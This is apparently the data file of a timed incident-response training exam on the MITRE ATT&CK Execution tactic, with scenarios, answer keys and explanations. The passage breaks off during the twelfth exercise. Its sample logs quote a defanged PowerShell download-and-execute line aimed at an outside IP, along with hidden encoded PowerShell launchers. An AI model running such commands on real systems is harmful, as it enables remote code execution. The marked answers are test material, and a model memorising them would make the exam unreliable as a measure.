<script type="application/json" id="exam-data">{"config":{"objectId":"TA0002","introTitle":"MITRE ATT&CK TA0002 — Execution","severity":"EXTREMELY HARD","difficulty":"extremely-hard","batch":4,"title":"TA0002 Execution — EXTREMELY HARD","minutes":60,"seconds":3600},"intro":{"entityHtml":"\u003ch2>What you will learn\u003c/h2>\u003cp>Welcome! This exam is about one part of the MITRE ATT&CK framework: the tactic called \u003cb>Execution\u003c/b>, with the ID \u003cb>TA0002\u003c/b>. You will learn what it is, why it matters, and how real security teams work with it every day.\u003c/p>\u003ch3>What is MITRE ATT&CK?\u003c/h3>\u003cp>MITRE ATT&CK is a big, public knowledge base. It describes what real attackers do, step by step. ATT&CK splits an attack into goals called \u003cb>tactics\u003c/b>. Every tactic has an ID that starts with \u003cb>TA\u003c/b>. Every way to reach a goal is called a \u003cb>technique\u003c/b>. Technique IDs start with \u003cb>T\u003c/b>.\u003c/p>\u003ch3>What is Execution (TA0002)?\u003c/h3>\u003cp>This object is a \u003cb>Tactic\u003c/b> — a goal, not a single action. The goal of TA0002 is simple: \u003cb>run attacker code on a target system\u003c/b>. Imagine an attacker sends an email with a bad attachment. An employee opens it. The attachment runs a script. At that moment the attacker has reached Execution: their code now runs inside the company. Before this step, the attacker often only has a document, a link, or a network position. After this step, their commands run on a real machine.\u003c/p>\u003cp>Execution usually comes right after \u003cb>Initial Access (TA0001)\u003c/b> and before \u003cb>Persistence (TA0003)\u003c/b>. Almost every serious attack needs this step. If defenders stop Execution, the attack usually stops too.\u003c/p>\u003ch3>Techniques that live under TA0002\u003c/h3>\u003cp>ATT&CK lists many ways to reach this goal. The best-known ones are: \u003cb>Command and Scripting Interpreter (T1059)\u003c/b> — for example PowerShell, Windows Command Shell, Unix Shell, AppleScript or Python; \u003cb>Windows Management Instrumentation (T1047)\u003c/b>; \u003cb>Scheduled Task/Job (T1053)\u003c/b>; \u003cb>User Execution (T1204)\u003c/b> — when a person opens a bad link or file; \u003cb>Exploitation for Client Execution (T1203)\u003c/b>; \u003cb>System Services (T1569)\u003c/b>; \u003cb>Inter-Process Communication (T1559)\u003c/b>; \u003cb>Hijack Execution Flow (T1574)\u003c/b>; \u003cb>Trusted Developer Utilities Proxy Execution (T1127)\u003c/b>; \u003cb>Native API (T1106)\u003c/b>; \u003cb>Software Deployment Tools (T1072)\u003c/b>; \u003cb>Shared Modules (T1129)\u003c/b>; \u003cb>Deploy Container (T1610)\u003c/b>; and \u003cb>Serverless Execution (T1648)\u003c/b>. Some techniques also serve other tactics — a scheduled task, for example, can execute code now (Execution) or start it again after a reboot (Persistence).\u003c/p>\u003ch3>Where is it used in real work?\u003c/h3>\u003cul>\u003cli>\u003cb>SOC analysts\u003c/b> see Execution alerts every day, for example: an Office program started PowerShell. They decide if it is an attack.\u003c/li>\u003cli>\u003cb>Threat hunters\u003c/b> search logs for attacker scripts: PowerShell script block logging (event 4104), process creation (4688), task creation (4698), service installs (7045).\u003c/li>\u003cli>\u003cb>Incident responders\u003c/b> stop running code, collect evidence, and clean systems.\u003c/li>\u003cli>\u003cb>Detection engineers\u003c/b> write rules for these events, for example: alert when a browser or Office app spawns a script interpreter.\u003c/li>\u003cli>\u003cb>Red teamers\u003c/b> use the same techniques (with written permission) to test defences.\u003c/li>\u003cli>\u003cb>GRC analysts and control owners\u003c/b> use TA0002 to justify controls like application allowlisting, exploit protection and user training.\u003c/li>\u003cli>\u003cb>Threat intelligence analysts\u003c/b> map adversary reports to TA0002 when they brief the CISO.\u003c/li>\u003c/ul>\u003ch3>What risks does it address?\u003c/h3>\u003cp>If you do not understand Execution, you miss the moment an attacker takes control of a machine. Files and network traffic can look normal, but one running script can steal data or start ransomware. That is why this tactic is one of the most important to master.\u003c/p>","rulesHtml":"\u003ch3>Difficulty of this file: EXTREMELY HARD\u003c/h3>\u003cp>Expert level. Senior-analyst decisions with three or more chained concepts, conflicting signals, incomplete data, real business cost, and answers that say ‘wait’ or ‘escalate’ instead of acting.\u003c/p>\u003ch3>Exercise types you will meet\u003c/h3>\u003cp>Multiple-choice questions, multi-select questions with partial credit, matching, drag-and-drop placement of techniques, ordering, fill-in-the-blank with a word bank, priority ranking, short branching scenarios, a log viewer with a filter box, and one small command-line lab.\u003c/p>\u003ch3>Scoring (please read — it helps you)\u003c/h3>\u003cul>\u003cli>Each exercise gives at most 1 point of credit. You pass with \u003cb>70%\u003c/b> over the exercises you answer.\u003c/li>\u003cli>Multi-item exercises (several correct options, several slots, several steps) give \u003cb>partial credit\u003c/b>: every correct item counts, but every wrong item subtracts. Selecting everything is worth 0, so only pick what you are sure of.\u003c/li>\u003cli>A partially correct answer still earns credit — for example 3 of 5 correct items give credit 0.60.\u003c/li>\u003c/ul>\u003ch3>Check buys you unlimited thinking time\u003c/h3>\u003cp>When you press \u003cb>Check\u003c/b>, the timer stops by itself. The feedback stays visible and you can study it as long as you want. The timer only runs again when you press \u003cb>Next\u003c/b> (or Final Submit on the last exercise). This is shown as “PAUSED — reviewing feedback”.\u003c/p>\u003ch3>Manual pause\u003c/h3>\u003cp>The \u003cb>Pause\u003c/b> button stops the timer for a real break. While it is paused, the exercise is hidden so nobody can read it. Press \u003cb>Resume\u003c/b> to continue.\u003c/p>\u003ch3>Skipping\u003c/h3>\u003cul>\u003cli>Every exercise has a \u003cb>Skip\u003c/b> button. Skipping hides the answer and moves the exercise to a review pool. The timer keeps running.\u003c/li>\u003cli>Before the exam ends you get a \u003cb>review screen\u003c/b> where you can answer skipped exercises as often as you like while time remains.\u003c/li>\u003cli>Skipped exercises that stay unanswered are \u003cb>excluded\u003c/b> from the score — they count neither for nor against you.\u003c/li>\u003c/ul>\u003ch3>Hints\u003c/h3>\u003cp>One hint per exercise. A hint costs \u003cb>−10% of that exercise’s credit\u003c/b> (never more). It gives a nudge, not the answer.\u003c/p>\u003ch3>Retake\u003c/h3>\u003cp>After the results screen you can retake the exam. Questions and answer choices are shuffled again.\u003c/p>"},"keywords":[{"theme":"Tactic objective & lifecycle position","chips":["Run attacker code on target","TA0002 = Execution","Follows Initial Access (TA0001)","Precedes Persistence (TA0003)","Adversary goal, not one action"]},{"theme":"Execution techniques & sub-techniques","chips":["T1059 Command and Scripting Interpreter","T1059.001 PowerShell","T1059.003 Windows Command Shell","T1059.004 Unix Shell","T1059.002 AppleScript","T1047 WMI","T1053 Scheduled Task/Job","T1053.005 Scheduled Task","T1204.001 Malicious Link","T1204.002 Malicious File","T1203 Exploitation for Client Execution","T1569.002 Service Execution","T1106 Native API","T1127.001 MSBuild","T1559 Inter-Process Communication","T1574 Hijack Execution Flow","T1072 Software Deployment Tools","T1129 Shared Modules","T1610 Deploy Container","T1648 Serverless Execution"]},{"theme":"Platforms & permissions","chips":["Windows","macOS","Linux","Containers","IaaS / Cloud","User vs administrator rights"]},{"theme":"Data sources & telemetry","chips":["Process creation (4688)","Script block logging (4104)","Module logging (4103)","Task creation (4698)","Service install (7045)","Sysmon process events","WMI activity logs","EDR telemetry"]},{"theme":"Detection logic & analytics","chips":["Office app spawning interpreter","Encoded command hunting","Parent-child process anomalies","Service created off-hours","Task registered at logon"]},{"theme":"Mitigations & controls","chips":["M1038 Execution Prevention","M1040 Behavior Prevention on Endpoint","M1017 User Training","M1049 Antivirus / Antimalware","M1050 Exploit Protection","M1026 Privileged Account Management","M1021 Restrict Web-Based Content"]},{"theme":"Adversary use & tooling","chips":["APT29","Lazarus","FIN7","Wizard Spider","OilRig","APT41","Cobalt Strike","PowerShell Empire","Metasploit"]}],"exercises":[{"id":"X01","type":"flow","summary":"Bridge under pressure — four chained decisions with noise and visibility gaps","scenario":["22:58. You are senior on the bridge. HOST-FIN-01 confirmed executing an encoded PowerShell from a lure at 22:41. The EDR sensor on 6 of 40 servers, including FIN-02, has a known gap between 22:58 and 23:04. Ticket #7233 (printer driver issue on FIN-01, opened 20:15) is still open and unrelated but keeps being quoted in chat. The CTO wants scope in 10 minutes. Four decisions chain — each depends on how you read the last one."],"artefacts":[{"label":"ARTEFACT 1 — SIEM timeline (confirmed host)","kind":"log","lines":["22:41:11  FIN-01  4688  WINWORD.EXE → powershell.exe -nop -w hidden -enc AAAA…","22:41:29  FIN-01  4104  IEX(Net.WebClient).DownloadString('hxxp://185[.]199[.]10[.]44/p[.]ps1')","22:42:5x  FIN-01  sensor heartbeat: OK","22:58:00–23:04:00  FIN-02, FIN-03, APP-04, DB-07, APP-09, WKS-2xx  sensor gap (agent upgrade)"]},{"label":"ARTEFACT 2 — Chat noise","kind":"text","body":["#inc-chat: “FIN-01 had a printer ticket tonight, maybe that's it?” — quoted 4 times, no evidence attached."]},{"label":"ARTEFACT 3 — Visibility note","kind":"text","body":["EDR agent upgrade rolled 22:55; six hosts report no events 22:58–23:04. Coverage incomplete, not necessarily uncompromised."]}],"question":"Take all four decisions in order.","hint":"A visibility gap is not an all-clear; report what is proven; automation can look identical to attack until ownership is proven; an active execution beats a batch window.","explanation":"Step 1: partial visibility means you cannot assert absence — the correct read is “execution confirmed before the gap; coverage partial”. Step 2: reporting only confirmed hosts with unknowns marked ‘under verification’ is the defensible scope; claiming all 40 or declaring certainty both break under questioning. Step 3: the same encoded command on three hosts that also run admin tooling is a genuine conflict — you treat it as attack until ownership is proven, because closing it as automation is exactly how real intrusions get waved through. Step 4: the 02:00 invoice batch is real cost, but a live execution on that host wins — isolate, document, and let the business own the batch decision with full information. The printer ticket is noise: no artefact links it to PowerShell lineage.","study":"Senior triage under visibility gaps, noise, and competing stakeholder pressure.","data":{"steps":[{"text":["Decision 1 — first interpretation of the situation:"],"artefacts":[],"options":[{"t":"No execution happened during the gap, so scope is FIN-01 only","why":"A telemetry gap shows nothing either way — absence is unprovable."},{"t":"Execution is confirmed on FIN-01 before the sensor gap; visibility is partial — do not assume absence elsewhere","correct":true,"why":"Correct — you assert what is proven and label the rest unknown."},{"t":"The printer ticket explains the PowerShell on FIN-01","why":"No artefact links a printer driver to the encoded command lineage."}]},{"text":["Decision 2 — the CTO demands scope in 10 minutes:"],"artefacts":[],"options":[{"t":"Report confirmed-execution hosts only; mark unknowns ‘under verification’","correct":true,"why":"Defensible scope: proven facts first, verification openly stated."},{"t":"State with certainty that nothing else happened","why":"Certainty is exactly what the visibility gap denies you."},{"t":"Claim all 40 hosts are compromised","why":"Over-claims panic leadership and unravel on first question."}]},{"text":["Decision 3 — new signal: the same encoded command appears on 3 hosts that also run admin automation tooling. Attack or automation?"],"artefacts":[],"options":[{"t":"Disable the alert rule to cut the noise","why":"Turning off the only signal is evidence destruction by another name."},{"t":"Treat as attack until ownership is proven; keep the hosts isolated","correct":true,"why":"Conflict resolved in favour of containment until an owner and change record prove automation."},{"t":"Close as automation because admin tooling exists","why":"Tooling presence is not proof of benign intent — this is how intrusions get waved through."}]},{"text":["Decision 4 — CISO decision now: the invoice batch runs at 02:00 on one affected host."],"artefacts":[],"options":[{"t":"Let it run and isolate after 02:00 with no monitoring","why":"Six unmonitored hours of attacker dwell on a finance host."},{"t":"Isolate that host now; accept the batch delay; document decision and evidence","correct":true,"why":"Active execution outweighs one batch; the cost is accepted consciously and recorded."},{"t":"Delete the scripts tonight to stop execution","why":"Destroys evidence and may not stop a task-based relaunch."}]}]}},{"id":"X02","type":"terminal","summary":"Court-grade evidence — read the malicious service config from HOST-DC-02 without changing anything","scenario":["Legal requirement, stated by counsel: “We need the configuration of service WinDefUpd on HOST-DC-02 preserved for court — read-only, exact, no state change. Operations meanwhile wants the payload stopped, but the DC must stay up; authentication for 12 sites rides on it.” The DC is reachable from your admin workstation under account ir01. Choose the tool and command yourself. If time expires, the exercise moves to the skipped pool."],"artefacts":[{"label":"ARTEFACT — Counsel’s constraints","kind":"text","body":["Read-only. Exact service configuration. No stop, no delete, no config change. The DC stays online."]},{"label":"ARTEFACT — Ops pressure note","kind":"text","body":["“Just kill it” is NOT authorised before capture. A stop or delete is a state change and loses the runtime evidence."]}],"question":"Type the command that reads the configuration of service WinDefUpd from HOST-DC-02 without changing anything, then press Run.","hint":"The service controller tool can query a remote host’s service configuration. Query — not stop, not delete.","explanation":"The canonical command is \u003cb>sc \\\\HOST-DC-02 qc WinDefUpd\u003c/b>. \u003cb>sc\u003c/b> is the Service Control utility. The UNC form \u003cb>\\\\HOST-DC-02\u003c/b> queries the remote DC. \u003cb>qc\u003c/b> means query configuration — purely read-only — and \u003cb>WinDefUpd\u003c/b> is the malicious service (T1569.002 artefact). The traps map to real incidents: \u003cb>sc delete\u003c/b> destroys the evidence legal demands; \u003cb>sc stop\u003c/b> changes state before capture; \u003cb>sc config\u003c/b> rewrites the service. Reading the configuration first is what makes the later cleanup defensible in court.","study":"Court-grade collection: query actions (qc) versus state-changing actions (stop, delete, config).","data":{"prompt":"PS C:\\Users\\ir01>","banner":["CyberPulse IR bridge — ADMIN-WS-1","Legal hold #5519 active. Target: HOST-DC-02 (reachable, domain controller)."],"simMatch":"^sc\\b.*qc\\b","sim":["SERVICE_NAME: WinDefUpd","        TYPE               : 10  WIN32_OWN_PROCESS","        START_TYPE         : 2   AUTO_START","        BINARY_PATH_NAME   : cmd.exe /c powershell -nop -w hidden -enc AAAA…","        DISPLAY_NAME       : Windows Defender Update","        SERVICE_NAME       : WinDefUpd (captured — output copy archived to evidence share)"],"notice":"⏱ This terminal exercise has its own timer: 4 minutes. If it expires, the exercise moves to the skipped pool.","timeLimit":240,"elements":[{"re":"^sc\\b","label":"Tool: sc (Service Control)","why":"The built-in service controller — the right tool for service configuration."},{"re":"host-dc-02","label":"Target: remote host HOST-DC-02","why":"The UNC path points sc at the remote DC."},{"re":"\\bqc\\b","label":"Action: qc (query configuration — read-only)","why":"qc reads the exact configuration without touching state."},{"re":"windefupd","label":"Service name: WinDefUpd","why":"The malicious service identified by the EDR."}],"danger":[{"re":"\\bdelete\\b","label":"DESTRUCTIVE: sc delete removes the service","why":"Deleting destroys the court exhibit and the attacker artefact in one stroke."},{"re":"\\bstop\\b","label":"State change: sc stop alters the runtime","why":"Stopping before capture changes state on a live DC under legal hold."},{"re":"\\bconfig\\b","label":"State change: sc config rewrites the service","why":"Config rewrites modify the evidence you were told to preserve."}],"canonical":"sc \\\\HOST-DC-02 qc WinDefUpd"}},{"id":"X03","type":"categorize","summary":"Chameleon artefacts — six artefacts, three tactics, intent and context decide","scenario":["The IR lead empties the evidence folder onto the table. “Six artefacts,” she says. “Several use the same underlying mechanisms. Assign each to the tactic its CONTEXT serves — and be ready to defend each one.”"],"artefacts":[{"label":"ARTEFACT — Context notes per artefact","kind":"text","body":["WMI one-shot during hands-on intrusion: the operator typed it interactively.","Monthly cron: fires on schedule, no operator present, re-launches the implant.","At job created right after cleanup scripts removed the implant: re-arms after removal.","Task with /rl HIGHEST created by the attacker to run the payload with admin rights.","msbuild executing an inline C# payload during the same hands-on session.","Boot-start service whose only documented purpose is launching the implant at every reboot."]}],"question":"Place every artefact into the tactic its context serves.","hint":"Interactive run = Execution. Scheduled re-arrival = Persistence. Rights gain = Privilege Escalation.","explanation":"Interactive WMI execution and msbuild running inline C# are \u003cb>Execution\u003c/b> — the operator wanted code to run now. Monthly cron and an At job re-arming the implant after cleanup are \u003cb>Persistence\u003c/b> — the artefact exists to bring code back. The /rl HIGHEST task is \u003cb>Privilege Escalation\u003c/b> — its context is the rights gain, not the run. The boot-start service whose purpose is relaunching at every reboot is \u003cb>Persistence\u003c/b>. Same binaries, same APIs — context is the only thing that separates the columns, and it is what senior analysts are paid to read.","study":"Context-based tactic assignment for T1053, T1569, T1047 and T1127.","data":{"zones":[{"title":"Execution (TA0002)"},{"title":"Persistence (TA0003)"},{"title":"Privilege Escalation (TA0004)"}],"items":[{"t":"One-shot WMI execute of the payload during hands-on intrusion","target":0,"why":"Interactive run — Execution."},{"t":"Monthly cron re-running the implant on schedule","target":1,"why":"Recurring re-arrival — Persistence."},{"t":"At job re-arming the implant right after cleanup removed it","target":1,"why":"Its purpose is survival after removal — Persistence."},{"t":"Task created with /rl HIGHEST to run the payload as admin","target":2,"why":"The rights gain is the point — Privilege Escalation."},{"t":"msbuild.exe executed an inline C# payload in the same session","target":0,"why":"Proxy execution during hands-on activity — Execution (T1127.001)."},{"t":"Boot-start service that launches the implant at every reboot","target":1,"why":"Reboot survival is the documented purpose — Persistence."}]}},{"id":"X04","type":"qcm","summary":"Executive laptop — the strongest next move when signals are thin","scenario":["One occurrence, three weeks old: WINWORD → powershell -enc on EXEC-VPN-01, the executive assistant’s laptop. The host also runs a known-good finance macro add-in. The spawned PowerShell binary matches the base OS build (no side-loading). No network callbacks appear anywhere. The assistant is on leave; nobody can ask her until Monday. It is Thursday night."],"artefacts":[{"label":"ARTEFACT — What you have","kind":"table","rows":[["Signal","Value"],["Occurrences","1 (three weeks ago)"],["Parent process","WINWORD.EXE"],["Command","powershell -nop -w hidden -enc AAAA…"],["Known-good add-in on host","Finance macro add-in (documented)"],["PS binary hash","Matches base OS build"],["Network callbacks","None observed"]]}],"question":"What is the strongest next move this shift?","hint":"One old event with a documented benign twin on the host is not enough to convict — and not enough to acquit.","explanation":"\u003cb>Keeping the case open and collecting more evidence is correct.\u003c/b> The defensible move is 4104 archives, the add-in manifest, and the full EDR process tree for that day. \u003cb>Isolating 200 hosts\u003c/b> on one three-week-old event is organisational malpractice. \u003cb>Closing on ‘only one occurrence’\u003c/b> is the trap — the encoded command has no benign explanation yet, and the add-in could be abused. \u003cb>Disabling Office for an executive assistant\u003c/b> has real business cost and still proves nothing. The senior habit: when the evidence is thin, the action is collection, not verdict.","study":"Conflicting-signal handling: when to collect instead of deciding.","data":{"options":[{"t":"Declare a full incident right now and isolate all 200 hosts tonight","why":"One three-week-old event cannot carry that cost."},{"t":"Close it as a false positive because it is only one occurrence","why":"No benign explanation for -enc exists yet; closing buries a possible intrusion."},{"t":"Keep the case open: pull 4104 history, the add-in manifest and the process tree","correct":true,"why":"Correct — thin evidence demands collection before any verdict."},{"t":"Disable the executive’s Office suite tonight as a precaution","why":"Real business cost, zero evidential gain."}]}},{"id":"X05","type":"flow","summary":"Two logs disagree — three chained reads of a conflicting picture","scenario":["22:41: the 4104 line shows the document spawning a downloader aimed at hxxp://185[.]199[.]10[.]44. The EDR network view shows no callback from the host — the process exited in 900 ms. The firewall proxy, though, shows HOST-FIN-01 reaching 185[.]199[.]10[.]44 at 22:41:32 from its second interface (VPN). CISO wants one line for the board within the hour. Three decisions chain."],"artefacts":[{"label":"ARTEFACT — The two disagreeing sources","kind":"table","rows":[["Source","Observation"],["EDR network view","No callback; PS process exited in 900 ms"],["Firewall proxy","Host reached 185[.]199[.]10[.]44 at 22:41:32 via VPN interface"],["4104 script text","Downloader aimed at that exact address"]]}],"question":"Take all three decisions in order.","hint":"Proxy egress evidence is hard for a host agent to miss; the senior read reconciles, it does not average.","explanation":"Step 1: an execution that looks blocked or ineffective with a proxy hit is not a clean false positive — verify before escalating. Step 2: when EDR (endpoint view) and proxy (egress view) conflict on outbound contact, the \u003cb>proxy egress evidence wins\u003c/b> for outbound facts — endpoint agents miss secondary interfaces; treat as contact until disproven. Step 3: the board line must be honest and complete: confirmed downloader run, host isolated, investigation continuing. ‘All clear’ is unproven, and ‘40,000 systems breached’ is fabrication. The senior skill is naming which source wins and why — not blending them into mush.","study":"Conflicting telemetry: which source wins for which fact class.","data":{"steps":[{"text":["Decision 1 — interpretation of the first picture:"],"artefacts":[],"options":[{"t":"Possible blocked or ineffective execution; verify with proxy and EDR before escalating","correct":true,"why":"Correct — reconcile sources before choosing a story."},{"t":"Confirmed C2 — isolate everything now","why":"The first picture is incomplete, not confirming."},{"t":"False positive by definition — the process exited","why":"A 900 ms exit plus a proxy hit is the opposite of clean."}]},{"text":["Decision 2 — the proxy shows contact from the second interface. What wins?"],"artefacts":[],"options":[{"t":"Proxy egress evidence wins for outbound; treat as contact until proven otherwise","correct":true,"why":"Correct — egress sources are authoritative for outbound contact."},{"t":"Average the two sources and wait","why":"Evidence is not weather — averaging is not a method."},{"t":"EDR’s null view wins; close the case","why":"Endpoint agents routinely miss secondary interfaces."}]},{"text":["Decision 3 — one line for the board:"],"artefacts":[],"options":[{"t":"Breach of 40,000 systems — full panic","why":"Fabrication that destroys organisational trust."},{"t":"All clear — no action needed","why":"Contradicted by the downloader and the proxy hit."},{"t":"Confirmed: document ran a downloader; host isolated; investigation continuing","correct":true,"why":"Honest, complete, and forward-looking."}]}]}},{"id":"X06","type":"match","summary":"Fidelity mapping — connect each execution question to its highest-fidelity telemetry","scenario":["Detection engineering review. The lead asks: for each question, which telemetry answers it with the highest fidelity — not just ‘some log’, the best one."],"artefacts":[],"question":"Match each question to the telemetry that answers it best.","hint":"Script text, task XML with author, service binary path, and the file’s provenance chain.","explanation":"‘What did the script actually say?’ — PowerShell 4104 script block logging: it captures text even when encoded at the command line. ‘Who wrote this task?’ — event 4698 together with the task XML: author SID, trigger and action in one artefact. ‘What binary does the service really run?’ — event 7045 plus the registry service key: path and parameters, not just a display name. ‘Where did this file come from?’ — email gateway metadata plus the Mark-of-the-Web / zone identifier: the provenance chain that user-execution analysis needs. Choosing the highest-fidelity source per question is the core of detection engineering judgement.","study":"Telemetry fidelity: which source answers which execution question best.","data":{"zones":[{"title":"What did the script text actually say? (T1059.001)"},{"title":"Who defined this task and when does it fire? (T1053.005)"},{"title":"What binary does the service really run? (T1569.002)"},{"title":"Where did the lure file come from? (T1204.002)"}],"items":[{"t":"PowerShell 4104 script block logging","target":0,"why":"Records executed script text — the content itself."},{"t":"Event 4698 together with the task XML","target":1,"why":"Author SID, trigger and action live in the task definition."},{"t":"Event 7045 plus the registry service key","target":2,"why":"Both carry the real binary path of the service."},{"t":"Email gateway metadata plus Mark-of-the-Web zone identifier","target":3,"why":"Together they rebuild the file’s provenance chain."}]}},{"id":"X07","type":"qcm","summary":"Architecture review — when the best practice is the wrong answer here","scenario":["The security architect proposes: “Block ALL script interpreters on every server — M1038 everywhere.” Context the proposal ignores: these servers run 60+ business applications that ship signed PowerShell-based installers and vendor update jobs; the SLA is 99.9%; change freezes start Friday. The last blanket block at another firm broke patching for a week."],"artefacts":[],"question":"What is the best decision for THIS context?","hint":"A widely quoted best practice can be the wrong answer when 60 signed business jobs depend on the interpreter.","explanation":"\u003cb>Phased allowlisting is correct.\u003c/b> Signed-publisher rules first on Tier-0 systems, wider telemetry elsewhere — this improves prevention without breaking 60 vendor jobs or the 99.9% SLA. \u003cb>The blanket block\u003c/b> is the textbook answer that becomes the wrong answer here: deployed tonight it guarantees an outage window and a week of exceptions. \u003cb>Doing nothing\u003c/b> abandons real risk. \u003cb>Renaming powershell.exe\u003c/b> is naive theatre that breaks signed scripts and evades nothing. The expert move is sequencing the control to the environment, not reciting the control.","study":"Control trade-offs: M1038 deployment vs business constraints.","data":{"options":[{"t":"Phased allowlisting: signed-publisher rules on Tier-0 first, wider telemetry","correct":true,"why":"Correct — real prevention without breaking the application estate."},{"t":"Deploy the blanket block tonight — the standard is clear on this","why":"Breaks 60 signed jobs and the SLA; the standard assumed a calmer estate."},{"t":"Rename powershell.exe on all servers before the Friday change freeze","why":"Naive theatre — breaks signed scripts and stops nothing determined."},{"t":"Do nothing at all — allowlisting is an obsolete idea by now","why":"Abandons real prevention on the crown jewels."}]}},{"id":"X08","type":"rank","summary":"Isolation board — rank four hosts for containment under business cost","scenario":["The war room asks: rank these four hosts for network isolation, 1 = isolate first. Each isolation has real cost; one has a hot standby."],"artefacts":[{"label":"ARTEFACT — Host cards","kind":"table","rows":[["Host","Signal","Cost note"],["HOST-DC-02","Service running encoded PowerShell","Auth for 12 sites; hot-standby DC-01 exists"],["FIN-SRV-03","Active downloader callbacks every 60 s","Payments batch 02:00"],["EXEC-LAP-04","Encoded PowerShell once, no callbacks","CISO’s own laptop"],["PRINT-SRV-09","Named only in a stale ticket; no signals","Print queue for floor 3"]]}],"question":"Assign the correct isolation rank to each host.","hint":"Active callbacks beat dormant signals; the DC isolates only because a standby exists; a ticket mention is not a signal.","explanation":"Rank 1: FIN-SRV-03 — \u003cb>active\u003c/b> callbacks every 60 s make it the live threat right now. Rank 2: HOST-DC-02 — worst asset, but isolation is safe here precisely because DC-01 standby exists; fail over, then isolate. Rank 3: EXEC-LAP-04 — a dormant single signal ranks below live and crown-jewel hosts. Rank 4: PRINT-SRV-09 — a stale ticket mention is not a signal; isolating it costs floor-3 printing for nothing. The ranking couples threat dynamism, asset value and mitigation availability — three factors, one decision.","study":"Containment ranking under real business cost.","data":{"items":[{"t":"FIN-SRV-03 — active downloader callbacks every 60 s","rank":1,"why":"The live threat now — isolate before it stages more."},{"t":"HOST-DC-02 — service running encoded PowerShell; hot standby DC-01 exists","rank":2,"why":"Worst asset, but failover makes isolation survivable — second."},{"t":"EXEC-LAP-04 — one encoded PowerShell run, no callbacks","rank":3,"why":"Dormant signal on a single-user laptop — third."},{"t":"PRINT-SRV-09 — named in a stale ticket, no signals","rank":4,"why":"No execution signal at all — isolation would be pure cost."}]}},{"id":"X09","type":"fill","summary":"Executive summary — complete the CISO’s one-paragraph report","scenario":["The CISO needs the executive summary tonight. Every gap must carry the exact term that survives scrutiny in the morning meeting."],"artefacts":[],"question":"Choose the correct fragment for each gap.","hint":"The intrusion reached the running-code stage; the interpreter was PowerShell; containment was isolation; retention follows legal.","explanation":"The summary must say: the intrusion reached the \u003cb>Execution\u003c/b> stage (TA0002) when a lure document spawned \u003cb>PowerShell\u003c/b>; containment was \u003cb>host network isolation\u003c/b>; evidence retention follows \u003cb>legal\u003c/b> requirements. The distractors are the classic wrong-register words: Initial Access would claim they only got in, Exfiltration claims data left, cmd.exe is the wrong interpreter, a full reimage contradicts evidence preservation, and ‘marketing’ is not a retention regime.","study":"Executive reporting for execution-stage incidents: precise terms, no inflation.","data":{"textWithBlanks":"Executive summary: the intrusion reached the {1} stage (TA0002) when a lure document spawned {2}. Containment was {3}; evidence retention follows {4} requirements.","blanks":[{"answer":"Execution","why":"TA0002 is the running-code stage the incident reached."},{"answer":"PowerShell","why":"The interpreter in this incident was PowerShell (T1059.001)."},{"answer":"host network isolation","why":"Containment was isolation, not reimage or deletion."},{"answer":"legal","why":"Evidence retention follows legal hold requirements."}],"bank":["Initial Access","Exfiltration","cmd.exe","full reimage","marketing"]}},{"id":"X10","type":"qcm","summary":"IR draft review — which fragment must change first?","scenario":["The IR summary draft lands in your inbox for review. One statement is wrong enough to change the whole report’s conclusion. The draft: ‘The scheduled task proves Initial Access (TA0001) occurred at 22:41. We recommend closing the case after antivirus cleanup.’ Artefacts on file: task created 22:41, PowerShell executed 22:41:20, entry vector never identified."],"artefacts":[{"label":"ARTEFACT — The draft under review","kind":"text","body":["“The scheduled task proves Initial Access (TA0001) occurred at 22:41. We recommend closing the case after antivirus cleanup.”"]}],"question":"Which fragment must change first?","hint":"A task that runs code is not the way the attacker got in — and the entry vector is still unknown.","explanation":"\u003cb>“proves Initial Access” is the fragment to change.\u003c/b> A scheduled task running code is Execution/Persistence territory — TA0002/TA0003 — never proof of Initial Access, and the artefacts openly say the entry vector is unidentified. \u003cb>The other three fragments\u003c/b> are all factually fine in place. The deeper error in the draft (closing the case) only becomes fixable once the tactic mapping stops misleading everyone; fix the mapping first and the recommendation rewrites itself.","study":"Kill-chain mapping discipline in IR reports.","data":{"options":[{"t":"“after antivirus cleanup”","why":"A debatable recommendation, but not the factual error."},{"t":"“proves Initial Access”","correct":true,"why":"Correct — a task proves execution/persistence, not the entry vector; the draft even says entry is unidentified."},{"t":"“at 22:41”","why":"The timestamp matches the artefacts."},{"t":"“The scheduled task”","why":"A task really was created and really did run code."}]}},{"id":"X11","type":"match","summary":"Adversary cards — match each group to its playbook and its best detection anchor","scenario":["The CTI refresh pins four adversary cards to the wall, each with the group’s public execution playbook and the telemetry anchor that best catches it."],"artefacts":[],"question":"Match each group to its documented playbook and anchor.","hint":"LNK lures, macro docs plus tasks, WMI plus services, and long-running PowerShell espionage.","explanation":"FIN7 rides on lure files — LNK and macro documents exploiting user execution; the anchor is Office spawning an interpreter. OilRig is publicly documented pairing macro delivery with scheduled tasks for recurring runs; the anchor is 4698 task creation with its author field. APT41 is documented using WMI and service execution across gaming and tech targets; the anchor is wmiprvse parent lines. Turla is documented in long-running espionage with PowerShell and WMI; the anchor is 4104 script text. Anchors that catch multiple actors are worth their tuning cost.","study":"Public procedure examples under TA0002 and their best telemetry anchors.","data":{"zones":[{"title":"FIN7"},{"title":"OilRig"},{"title":"APT41"},{"title":"Turla"}],"items":[{"t":"LNK and macro lures riding on user execution — anchor: Office spawning interpreter","target":0,"why":"Their lure-first playbook is the signature."},{"t":"Macro delivery plus scheduled tasks for recurring runs — anchor: 4698 with author field","target":1,"why":"Documented macro + task pairing in public reporting."},{"t":"WMI and service execution across gaming and tech targets — anchor: wmiprvse parent lines","target":2,"why":"Their WMI/service execution shows in WMI-hosted lineages."},{"t":"PowerShell and WMI in long-running espionage — anchor: 4104 script text","target":3,"why":"Their long scripts leave rich 4104 content."}]}},{"id":"X12","type":"qcm","summary":"Triple artefact — one run, three candidate mappings, follow the run event","scenario":["All artefacts from HOST-DC-02, 02:14: event 7045 installs service HealthCore (auto-start) with path cmd /c powershell -enc; event 4698 registers task HealthCheck in the same minute; event 4688 shows services.exe → cmd.exe → powershell.exe at 02:14:11; no task-run event exists; the payload ran exactly once; no reboot followed."],"artefacts":[{"label":"ARTEFACT — All three config/run events","kind":"log","filter":true,"lines":["02:14:03  Event 7045  Service installed: HealthCore (AUTO_START)  Path: cmd.exe /c powershell -enc AAAA…","02:14:05  Event 4698  Task registered: HealthCheck  Action: powershell -enc AAAA…","02:14:09  Event 4688  services.exe → cmd.exe /c …","02:14:11  Event 4688  cmd.exe → powershell.exe -nop -enc AAAA…","(no Microsoft-Windows-TaskScheduler run events; no reboot in 